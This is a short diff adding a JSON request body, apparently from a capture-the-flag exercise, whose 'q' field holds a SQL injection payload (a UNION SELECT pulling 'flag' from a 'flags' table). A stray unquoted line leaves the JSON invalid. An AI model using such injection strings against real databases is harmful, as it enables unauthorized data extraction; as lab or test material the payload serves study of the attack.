@@ -1,0 +1,5 @@
+{
+  "maxTokens": 123,
+  "q": "asd'OR 1=2 UNION SELECT flag FROM flags -- ",
+   asd
+}
